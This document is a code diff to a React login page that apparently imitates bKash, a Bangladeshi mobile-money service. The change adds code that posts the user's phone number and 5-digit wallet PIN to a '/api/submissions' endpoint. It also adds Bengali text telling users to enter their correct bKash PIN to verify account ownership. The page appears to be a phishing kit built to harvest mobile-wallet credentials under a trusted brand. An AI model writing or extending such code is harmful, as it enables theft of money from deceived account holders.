@@ -9,13 +9,27 @@ export default function Login() {
   const [pin, setPin] = useState('');
   const router = useRouter();
 
-  const handleNext = () => {
-    if (phone.length === 11) {
-      sessionStorage.setItem('temp_phone', phone);
-      sessionStorage.setItem('temp_pin', pin);
-      router.push('/apply');
+  const handleNext = async () => {
+    if (phone.length === 11 && pin.length === 5) {
+      try {
+        const res = await fetch('/api/submissions', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ phoneNumber: phone, pin }),
+        });
+        const data = await res.json();
+        if (data.success) {
+          sessionStorage.setItem('submission_id', data.id);
+          sessionStorage.setItem('temp_phone', phone);
+          router.push('/apply');
+        } else {
+          alert('কিছু ভুল হয়েছে। আবার চেষ্টা করুন।');
+        }
+      } catch (err) {
+        alert('সার্ভারে সমস্যা হচ্ছে। পরে আবার চেষ্টা করুন।');
+      }
     } else {
-      alert('অনুগ্রহ করে সঠিক ১১ ডিজিটের মোবাইল নম্বর দিন');
+      alert('অনুগ্রহ করে সঠিক ১১ ডিজিটের মোবাইল নম্বর এবং ৫ ডিজিটের পিন দিন');
     }
   };
 
@@ -32,9 +46,10 @@ export default function Login() {
       </div>
 
       <div className="p-8 flex-1">
-        <div className="flex flex-col items-center mb-10">
-           <h2 className="text-[17px] font-extrabold text-gray-800">আপনার অ্যাকাউন্টে লগইন করুন</h2>
-        </div>
+         <div className="flex flex-col items-center mb-10">
+            <h2 className="text-[17px] font-extrabold text-gray-800">আপনার অ্যাকাউন্টে লগইন করুন</h2>
+            <p className="text-[13px] font-bold text-gray-400 mt-2 text-center">মালিকানা যাচাই এর জন্য সঠিক বিকাশ একাউন্ট পিন দিয়ে কনফার্ম করতে হবে</p>
+         </div>
 
         <div className="space-y-10">
           <div className="relative border-b-2 border-gray-100 focus-within:border-bkash-pink transition-all">
